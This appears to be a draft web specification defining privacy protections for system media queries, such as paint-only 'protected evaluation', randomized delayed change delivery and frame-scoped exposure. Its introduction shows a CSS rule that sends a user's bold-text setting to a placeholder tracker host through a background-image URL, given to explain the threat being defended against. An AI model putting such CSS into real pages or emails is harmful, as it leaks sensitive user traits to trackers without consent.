<h2 id=intro>Introduction</h2>

*This section is non-normative.*

Media queries were designed to describe the output device: the size of the viewport, the color depth of
the screen, whether there is a mouse. The system media query specifications add features that describe
the user's situation instead: whether the device is saving power, whether the window is focused,
whether the screen is being shared, whether the user has asked for bold text. That information helps
pages adapt, and it is also the kind of information that trackers collect.

Media features are unusual among web platform features, because a page doesn't need script to read them.
A style sheet can send a feature's value to a server by loading a resource only when the query matches:

<div class=example id=example-exfiltration>
    <pre highlight=css>
    @media (prefers-bold-text: bold) {
      body { background-image: url("https://tracker.example/collect?bold-text=1"); }
    }
    </pre>

    This works with script turned off, in HTML email clients that load remote images, and on any site where
    an attacker can add CSS but not script. The request also tells the server when the page was loaded,
    and a rule like it that matches only after a change tells the server when the value changed.
</div>

Turning the features off in those places, the usual answer, gives up what they are for. This
specification gives the system media query specifications better tools:

: [[#protected]]
:: The page's appearance adapts to the user, but nothing the page can measure changes: not script, not
    layout, not network requests. The only way for a page to learn the value is to ask the user.
: [[#delayed-delivery]]
:: When a value changes, documents learn of the change one at a time, when they are visible, after a
    random delay, so a tracker on two sites can't match the two visits by when the value changed.
: [[#frame-scoped]]
:: Embedded documents from other origins see a restricted value unless the page embedding them allows
    more.
: [[#reduced-exposure]]
:: Where the user agent is already protecting the user from fingerprinting, features report values that
    don't depend on the user.

Each system media query specification says which of these apply to each of its features, and why.


<h2 id=threat-model>Threat model</h2>

*This section is non-normative.*

<h3 id=attackers>Attackers</h3>

: First-party sites
:: A site the user visits reads features in order to fingerprint the user, or to infer something about
    them.
: Third-party content
:: A tracker whose documents are embedded in many sites, or whose script many sites include, tries to
    recognize the same user on each of them. Partitioned storage stops it from using cookies to do this,
    so it looks for values that are the same, or that change at the same moment, in each context.
: Style-only attackers
:: Someone who can add CSS but not script: the author of an HTML email, a page viewed with script
    blocked, a user-provided theme, or an attacker exploiting a CSS injection vulnerability in a site
    the user trusts.
: Content that evades review
:: A page that shows one thing to its target and something else to people and systems that check it,
    such as family members, support staff, moderators, or security scanners.

<h3 id=attacker-goals>Goals</h3>

: Fingerprinting
:: A value that stays the same for a long time adds to an identifier that doesn't need storage.
: Correlation
:: A value that changes at one instant in many contexts links those contexts to one user, even if the
    value itself is common.
: Inference
:: A value reveals something sensitive about the user: a disability or health condition, their age, what
    they are doing, where they are, or who else can see their screen.
: Evasion
:: A value lets a page look harmless to anyone checking it.

<h3 id=channels>Channels</h3>

A document can learn the result of a media query in these ways. A protection has to address all of them.

<table class=data>
    <thead><tr><th>Channel<th>Examples<th>Addressed by
    <tbody>
        <tr><td>Script
            <td><code>matchMedia()</code>, <code>MediaQueryList</code> <code>change</code> events,
                <code>getComputedStyle()</code>, the CSSOM
            <td>[[#protected]], [[#frame-scoped]]
        <tr><td>Layout
            <td>Element sizes and positions read through CSSOM View, <code>ResizeObserver</code>,
                <code>IntersectionObserver</code>, scroll positions
            <td>[[#protected]]
        <tr><td>Network
            <td>A <code>url()</code> in a rule that applies only under one result; an
                <code>@import</code> or <code>&lt;link></code> with a media query; <code>&lt;source
                media></code>; a font loaded because a rule changed <code>font-weight</code>; a lazy-loaded
                image that enters the viewport because layout changed
            <td>[[#protected]]
        <tr><td>Timing
            <td>The moment a value changes, observed in two documents
            <td>[[#delayed-delivery]]
        <tr><td>Interaction
            <td>The user clicks something that is visible only under one result
            <td>Not addressed; see [[#residual-risks]]
        <tr><td>Pixels
            <td>An API that renders the document into pixels that script can read
            <td>[[#protected]]
</table>

<h3 id=measuring>Measuring fingerprinting</h3>

Fingerprinting is measured in bits of information. If a fraction |p| of users have a value, a site that
sees the value learns −log<sub>2</sub>(|p|) bits about the user. Across all users, the average is the
entropy: the sum over the values of −|p| log<sub>2</sub>(|p|). About 33 bits are enough to single out
one person among 8 billion.

The average hides who pays. For a setting that few people turn on, the average is small, but the people
who have turned it on are much easier to identify:

<table class=data id=entropy-table>
    <thead><tr><th>Users with the setting on<th>Bits when on<th>Bits when off<th>Average
    <tbody>
        <tr><td>50%<td>1.00<td>1.00<td>1.00
        <tr><td>10%<td>3.32<td>0.15<td>0.47
        <tr><td>1%<td>6.64<td>0.01<td>0.08
        <tr><td>0.1%<td>9.97<td>0.00<td>0.01
</table>

The system media query specifications therefore report the bits a feature reveals about the users who
have the uncommon value, not the average. When a setting is used mostly by people with a disability, the
users who are easiest to identify are the users with that disability.

Features add up only when they are independent. Settings that tend to be turned on together, such as two
accessibility settings, reveal less in combination than their sum, and a value that script or HTTP already
reveals adds nothing on its own. It can still matter, because it reaches places that script and HTTP
headers don't, such as a style sheet in an email.


<h2 id=terms>Terms</h2>

A <dfn export>system media feature</dfn> is a [=media feature=] whose value comes from the user's device,
operating system, user agent settings, or surroundings, rather than from the document or the viewport.

A system media feature's <dfn export>actual value</dfn> is the value that its specification describes,
such as whether power saving is on.


<h2 id=protected>Protected evaluation</h2>

<h3 id=protected-definitions>Protected media features</h3>

A specification can define a [=system media feature=] as a <dfn export>protected media feature</dfn>,
and give it an <dfn export>observable value</dfn>: a value that doesn't depend on the user, usually the
value that most users have.

For each [=document=], the specification of a protected media feature says whether the document uses
<dfn export>full evaluation</dfn> or <dfn export>protected evaluation</dfn> for it. In full evaluation, the
feature is like any other media feature: every query uses its [=actual value=]. The rest of this section
defines protected evaluation.

A rule <dfn>depends on</dfn> a feature if the feature appears in the media query list of an
''@media'' rule that contains it, of the style sheet that contains it, or of an <code>@import</code> rule
or <code>&lt;link></code> element through which that style sheet was loaded, including through a custom
media query that uses the feature.

<h3 id=two-styles>Observable style and painted style</h3>

In a document that uses protected evaluation for one or more protected media features:

* The <dfn export>observable style</dfn> of an element is its style computed with each of those features
    taking its [=observable value=].
* The <dfn export>painted style</dfn> of an element is its style computed with each of those features
    taking its [=actual value=].

Every other media feature has the same value in both. When all of the features' actual values equal
their observable values, the two styles are the same.

When the user agent paints an element, it uses the painted style for the [=paint-only properties=], and
the observable style for every other property. Everything else the user agent does with style uses the
observable style. In particular:

1. Media queries in the document that are evaluated outside style rules, such as the
    <code>media</code> attributes of <code>&lt;source></code> and <code>&lt;meta name=theme-color></code>,
    and <code>matchMedia()</code>, use the observable value. So do any other APIs that report whether a
    media query matches.
1. <code>getComputedStyle()</code>, the Typed OM, and all other APIs that return style values return the
    observable style.
1. Box generation, layout, scrolling, hit testing, focus, selection, and the accessibility tree use the
    observable style.
1. Resources are fetched only as the observable style requires. A style sheet whose media query list uses
    a protected media feature, and a style sheet loaded by an <code>@import</code> rule whose media query
    list uses one, is fetched whether or not the query matches.
1. Transitions and animations are created, run, and reported only from the observable style. A
    difference between the painted style and the observable style never starts a transition or an
    animation, and when an [=actual value=] changes, the user agent paints the new painted style without
    a transition.
1. An API that renders document content into pixels that script can read, and any other API that
    exposes the result of painting to the document, uses the observable style. This doesn't apply to
    captures of the screen, window, or tab that the user starts through the user agent's own interface.
1. Performance entries, <code>requestAnimationFrame()</code> callbacks, and other effects that the
    document can observe must not differ because the painted style differs from the observable style.
    User agents should also avoid timing differences, for example by painting both kinds of change the
    same way.

<div class=note>
    This is the same approach that user agents take to <code>:visited</code> links [[CSS-VISITED]]: a
    visited link can be painted in a different color, but script, layout, and the network see an
    unvisited link. The list of paint-only properties here is longer, because none of the properties in
    it affect layout.
</div>

<h3 id=paint-only>Paint-only properties</h3>

The <dfn export>paint-only properties</dfn> are the properties below, including their logical
equivalents. Shorthands such as 'border-color' and 'outline' set the paint-only longhands they expand to;
their other longhands keep their observable values.

* 'color'
* 'background-color'
* 'background-image', when every layer's value is ''background-image/none'' or a <<gradient>>.
    If any layer is another image, the observable value is used.
* 'border-top-color', 'border-right-color', 'border-bottom-color', 'border-left-color'
* 'outline-color', 'outline-style', 'outline-width', 'outline-offset'
* 'box-shadow', 'text-shadow'
* 'text-decoration-line', 'text-decoration-style', 'text-decoration-color', 'text-decoration-thickness',
    'text-underline-offset', 'text-underline-position'
* '-webkit-text-stroke-color', '-webkit-text-stroke-width'
* 'column-rule-color'
* 'caret-color', 'caret-animation', 'caret-shape'
* 'accent-color', 'scrollbar-color'
* 'fill', 'fill-opacity', 'stroke', 'stroke-opacity', 'stroke-width', 'stroke-dasharray',
    'stroke-dashoffset'. If a paint server is referenced by a <code>url()</code> that doesn't point to
    an element in the same document, the observable value is used.

None of these properties changes the size or position of any box, the scrollable overflow, what is hit
by a pointer, what can be focused, or what the accessibility tree contains, and none of their allowed
values fetches a resource.

Custom properties and other properties still take part in the cascade of the painted style: a
paint-only property can use ''var()'', ''currentcolor'', or ''em'' units, and gets the values that the
painted style gives them.

<div class=example id=example-masking>
    A banking site hides the account balance while the screen is shared. An overlay that always exists,
    and is always transparent in the observable style, is painted solid in a capture. Nothing about the
    element's size, the accessibility tree, or clicks changes.

    <pre highlight=css>
    .balance { position: relative; }
    .balance::after {
      content: "";
      position: absolute;
      inset: 0;
      pointer-events: none;
      background-color: transparent;
    }

    @media (screen-capture: active) {
      .balance::after { background-color: gray; }
      /* Ignored during protected evaluation: display isn't a paint-only property. */
      .balance { display: none; }
    }
    </pre>
</div>

<h3 id=protected-implementation>Implementation notes</h3>

*This section is non-normative.*

The user agent only needs the painted style for elements matched by rules that [=depend on=] a
protected media feature, and only while that feature's actual value differs from its observable value.
Most documents have no such rules, and most users have the observable value, so most documents never
compute a second style.

<h3 id=residual-risks>What protected evaluation doesn't prevent</h3>

*This section is non-normative.*

* **Interaction.** A page can show something only under one result, such as a link that says "click
    here", and learn the result if the user reacts to it. This needs the user's help, reveals the result
    only to pages that trick the user, and is the same weakness that <code>:visited</code> has.
* **Captures the user shares with the page.** If the user lets a page capture its own tab, the page can
    see what was painted. The user agent's capture prompt asks the user first.
* **People.** Anyone who can see the user's screen can see the result.
* **Timing.** A user agent that repaints more slowly for a painted-style change could leak the result
    through paint timing. [[#two-styles]] asks user agents to avoid this, and the problem is the one
    <code>:visited</code> implementations already solved.


<h2 id=delayed-delivery>Delayed change delivery</h2>

<h3 id=delivery-definitions>Delivered values</h3>

A specification can say that a [=system media feature=] uses <dfn export>delayed change delivery</dfn>,
and give a <dfn export>maximum delay</dfn> and a <dfn export>minimum interval</dfn>. This applies to
documents that use the feature's actual value; a document that uses [=protected evaluation=] for the
feature doesn't observe its value, so its painted style updates immediately.

Each [=document=] has a <dfn>delivered value</dfn> for the feature, which is the value its media queries
use. When the document is created, its [=delivered value=] is the [=actual value=].

To <dfn>deliver a value</dfn> to a document, set its delivered value to the actual value, restyle the
document, and fire <code>change</code> events at the affected <code>MediaQueryList</code> objects, as
for any other media feature change.

Whenever the actual value changes, and whenever a document's [=visibility state=] becomes
"<code>visible</code>", including when it is restored from the back/forward cache, run these steps for
each document whose delivered value differs from the actual value:

1. If the document's visibility state is "<code>hidden</code>", stop. The document will be updated when
    it becomes visible.
1. If less than the minimum interval has passed since a value was last delivered to the document,
    wait until it has, then start these steps again.
1. If these steps were run because the document's visibility state became "<code>visible</code>",
    [=deliver a value=] to it in the same task in which the <code>visibilitychange</code> event is fired,
    and stop.
1. If a delivery to the document is already pending, stop.
1. Choose a delay uniformly at random between zero and the maximum delay, independently for this
    document and this change.
1. After the delay, if the document is still visible and its delivered value still differs from the
    actual value, [=deliver a value=] to it.

<h3 id=delivery-rationale>Why this works, and its limits</h3>

*This section is non-normative.*

When the same value changes in two documents at the same instant, a tracker present in both can match
them, however common the value. The Battery Status API showed this in practice: the battery level and
the time it took to change were enough to link a user's visits to different sites [[LEAKING-BATTERY]].

A hidden document learns of a change only when it becomes visible. The moment a document becomes visible
is already revealed by the <code>visibilitychange</code> event, and when the user switches tabs, the
document being hidden and the document being shown already fire their events together. A document that
learns of a change this way therefore learns nothing about when the change happened.

A document that is visible when the change happens learns of it after a random delay. On a phone, only
one document is usually visible, so the delay rarely matters. On a desktop, several windows can be visible
at once, and the delay means that two of them learn of the same change up to the maximum delay apart.

The delay weakens the link from a single change; it doesn't remove it. Suppose a tracker sees a million
users, and each has one change a day at a random time. With a maximum delay of 60 seconds, about 0.14% of
the other users also have a change within 60 seconds of any given change, so one matching change narrows
a million candidates to about 1,400, two narrow them to about 2, and three identify the user. The minimum
interval limits how many changes a tracker can see. The rest of the protection comes from how rarely two
documents are visible when the value changes, which is why specifications use this mechanism for values
that change rarely, and use [[#frame-scoped]] as well when embedded content doesn't need the
value.


<h2 id=frame-scoped>Frame-scoped exposure</h2>

A specification can say that a [=system media feature=] uses <dfn export>frame-scoped exposure</dfn>. It
names a [=policy-controlled feature=] whose [=policy-controlled feature/default allowlist=] is <code>&#39;self&#39;</code>, and says what
the feature does in a document that isn't allowed to use that policy-controlled feature: either it takes a
<dfn export>restricted value</dfn> that the specification defines, or the document uses
[=protected evaluation=] for it.

With the default allowlist, top-level documents and same-origin frames use the feature normally. A
cross-origin frame does so only if the page embedding it allows it:

<div class=example id=example-allow>
    <pre highlight=html>
    &lt;iframe src="https://widgets.example/chat" allow="window-focus-state">&lt;/iframe>
    </pre>
</div>

A site can also turn the feature off for itself and all of its frames with a
<code>Permissions-Policy</code> header.

<div class=note>
    Trackers that link visits across sites are embedded in those sites. Cross-origin frames that don't
    need a value, which is most of them, don't get it, and the site that embeds a frame decides.
</div>


<h2 id=reduced-exposure>Reduced-exposure contexts</h2>

A [=document=] is in a <dfn export>reduced-exposure context</dfn> when any of these is true:

* The user agent protects the document against fingerprinting in other ways, such as in a private
    browsing mode that also reports a standard screen size, limits the fonts it reveals, or gives
    rounded timer values.
* The user agent hides the user's IP address from the document's origin, such as through a proxy or
    relay it runs. Without the IP address, a value that changes when the user's network changes is more
    useful for linking visits.
* Scripting is disabled for the document because of a user or user agent choice made for privacy or
    safety, such as a message shown in an email client.
* The user has turned off exposure of the feature, as described in [[#user-control]].

The user agent decides which of its modes count. Each system media query specification says what its
features do in a reduced-exposure context: take a fixed value, or use protected evaluation.

<h3 id=user-control>User control</h3>

When a specification says a system media feature is <dfn export>under user control</dfn>, the user agent
must give the user a way to stop exposing it. When the user does, every document is in a reduced-exposure context for that
feature. The user agent may offer this for each site as well as for all sites.


<h2 id=choosing>Choosing protections</h2>

*This section is non-normative.*

Specifications that define system media features should use this table to choose protections, and should
explain their choice in their privacy considerations.

<table class=data>
    <thead><tr><th>If the feature…<th>then use
    <tbody>
        <tr><td>reveals something sensitive, or could help a page evade review, and its uses are visual
            <td>[[#protected]]
        <tr><td>changes while documents are open, and doesn't need to take effect the instant it changes
            <td>[[#delayed-delivery]]
        <tr><td>must take effect the instant it changes, and script in the same documents already sees
            that instant
            <td>no delay, and name the API that already exposes it
        <tr><td>isn't needed by most embedded third-party content
            <td>[[#frame-scoped]]
        <tr><td>is already available to script, and to servers through HTTP
            <td>a requirement that the value match what script sees, so nothing new is revealed
</table>

<table class=data>
    <thead><tr><th>Specification<th>Protected evaluation<th>Delayed delivery<th>Frame-scoped<th>User control
    <tbody>
        <tr><td>Reduced Power Preference<td><td>Yes<td><td>Yes
        <tr><td>Network Media Queries<td><td>''connection'' only<td><td>Yes
        <tr><td>Window Focus<td><td><td>Yes<td>
        <tr><td>Screen Capture<td>Always<td><td><td>Yes
        <tr><td>Keyboard Media Queries<td><td>''keyboard'' only<td>Yes<td>Yes
        <tr><td>Accessibility Preferences<td>When not shared<td>Yes<td>Yes<td>Yes
        <tr><td>Regional Preferences<td><td><td><td>Through <code>Intl</code>
        <tr><td>Platform<td><td><td><td>Through the <code>User-Agent</code> header
        <tr><td>Form Factor<td><td><td>Yes<td>Yes
</table>


<h2 id=privacy>Privacy considerations</h2>

The mechanisms in this specification reduce what a document can learn; they don't make every feature
safe to add. A specification that uses them still needs to show that its features are worth what they
reveal after the protections apply, and to describe what they still reveal.

[=Protected evaluation=] hides a value from the document, not from the user or from people who can see the
screen. [=Delayed change delivery=] raises the cost of linking visits by timing, and gets weaker as a
tracker observes more changes. [=Frame-scoped exposure=] does nothing against a tracker that sites include
as first-party script.


<h2 id=security>Security considerations</h2>

* [=Protected evaluation=] doesn't change hit testing, so a pointer hits an element where its observable
    box is, even if the painted style has made it transparent. This lets a page hide a button from the
    user while it can still be clicked, which a page can already do with any style.
* Computing a second style costs time. A page can't make the user agent do that work unless the user has
    a value different from the observable value, and user agents can limit the number of elements they
    compute it for.


<h2 id=open-issues>Open issues</h2>

<p class=issue>Should 'opacity' and 'filter' be paint-only properties? They are the most natural way to
hide or blur content, but they create stacking contexts, and 'filter' creates a containing block, so the
painted style would need a different paint order from the one used for hit testing.

<p class=issue>Are the maximum delays and minimum intervals chosen by the system media query
specifications right? Longer delays protect better and adapt more slowly.

<p class=issue>Should a document be able to find out whether it uses protected evaluation for a feature,
so that its author can choose a design that works with paint-only properties? Knowing that reveals
whether the user has turned off sharing, which is less than the value but not nothing.
